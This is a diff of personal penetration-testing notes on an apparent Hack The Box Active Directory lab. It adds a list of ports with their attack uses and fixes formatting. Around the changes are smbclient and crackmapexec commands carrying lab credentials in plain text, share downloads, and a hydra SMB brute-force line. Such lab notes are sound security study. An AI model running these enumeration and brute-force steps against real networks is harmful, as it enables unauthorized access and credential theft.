@@ -1,3 +1,17 @@
+# help
+
+ > **TCP 88 (Kerberos)**: Kerberos uses this port for authentication in the Active Directory. From a penetration testing point of view, it can be a goldmine for ticket attacks like Pass-the-Ticket and Kerberoasting.
+ 
+ > **TCP 135 (RPC Endpoint Mapper)**: This TCP port is used for Remote Procedure Calls (RPC). It might be leveraged to identify services for lateral movement or remote code execution via DCOM.
+ 
+ > **TCP 139 (NetBIOS Session Service)**: This port is used for file sharing in older Windows systems. It can be abused for null sessions and information gathering.
+ 
+ > **TCP 389 (LDAP)**: This TCP port is used by the Lightweight Directory Access Protocol (LDAP). It is in plaintext and can be a prime target for enumerating AD objects, users, and policies.
+ 
+ > **TCP 445 (SMB)**: Critical for file sharing and remote admin; abused for exploits like EternalBlue, SMB relay attacks, and credential theft.
+ 
+ > **TCP 636 (LDAPS)**: This port is used by Secure LDAP. Although it is encrypted, it can still expose AD structure if misconfigured and can be abused via certificate-based attacks like AD CS exploitation.
+
 # edit /etc/hosts
 - add the IP for sequel.htb
 
@@ -19,7 +33,7 @@ ff02::2		ip6-allrouters
 
 > smbmap -u rose -p KxEPkKe6R8su -H 10.10.11.51
 
-` ` `
+```
 IP: 10.10.11.51:445 Name: 10.10.11.51               Status: Authenticated
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
@@ -31,7 +45,7 @@ IP: 10.10.11.51:445 Name: 10.10.11.51               Status: Authenticated
         SYSVOL                                                  READ ONLY       Logon server share 
         Users                                                   READ ONLY
 
-` ` `
+```
 
 # access share
 
@@ -48,8 +62,11 @@ NULL		NULL		sa@sequel.htb		sa			MSSQLP@ssw0rd!
 ```
 
 > smbclient //10.10.11.51/"Accounting Department" -U "SEQUEL\angela%0fwz7Q4mSpurIt99"
+
 > smbclient //10.10.11.51/"Accounting Department" -U "SEQUEL\oscar%86LxLBMgEWaKUnBG"
+
 > smbclient //10.10.11.51/"Accounting Department" -U "SEQUEL\kevin%Md9Wlq1E5bZnVDVo"
+
 > smbclient //10.10.11.51/"Accounting Department" -U "SEQUEL\sa%MSSQLP@ssw0rd!"
 
 > smbclient //10.10.11.51/Users -U "SEQUEL\oscar%86LxLBMgEWaKUnBG" -c "prompt OFF; recurse ON; mget -a*
@@ -101,11 +118,13 @@ Access denied on 10.10.11.51, no fun for you...
 
 > look for content of multiple files
 
-```find . -type f -name "*.txt" | while IFS= read -r file; do
+```
+find . -type f -name "*.txt" | while IFS= read -r file; do
     echo "===== Content of $file ====="
     cat "$file"
     echo -e "\n\n\nEND\n\n"
-done```
+done
+```
 
 > inside oscar folder
 
@@ -120,7 +139,8 @@ grep: ./users/Default/NTUSER.DAT: binary file matches`
 
 >  crackmapexec smb 10.10.11.51 -u rose -p KxEPkKe6R8su --shares --users --groups --local-group 
 
-```SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
+```
+SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
 
 [*] completed: 100.00% (1/1)
 SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
@@ -134,7 +154,7 @@ SMB         10.10.11.51     445    DC01             sequel.htb\ryan             
 SMB         10.10.11.51     445    DC01             sequel.htb\michael                        badpwdcount: 1 desc:                                                                                    
 SMB         10.10.11.51     445    DC01             sequel.htb\krbtgt                         badpwdcount: 1 desc: Key Distribution Center Service Account                                            
 SMB         10.10.11.51     445    DC01             sequel.htb\Guest                          badpwdcount: 1 desc: Built-in account for guest access to the computer/domain                           
-SMB         10.10.11.51     445    DC01             sequel.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain                
+SMB         10.10.11.51     445    DC01             sequel.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain             
 ```
 
 > crackmapexec smb 10.10.11.51 -u rose -p KxEPkKe6R8su --groups rose
@@ -159,10 +179,12 @@ SMB         10.10.11.51     445    DC01             [+] Enumerated members of do
 - add `-t 1` to make HYDRA LESS NOISY
 
 - for testing SMBv2
+
 ```
 [/home/kali/tryhackme/thc-hydra]
 └─# ./hydra -t 4 -L /home/kali/htb/attack2/users.txt -P /home/kali/htb/attack2/passwordlist.txt smb2://10.10.11.51
 ```
+
 ![[Pasted image 20250518200133.png]]
 # Login into MSSQL
 
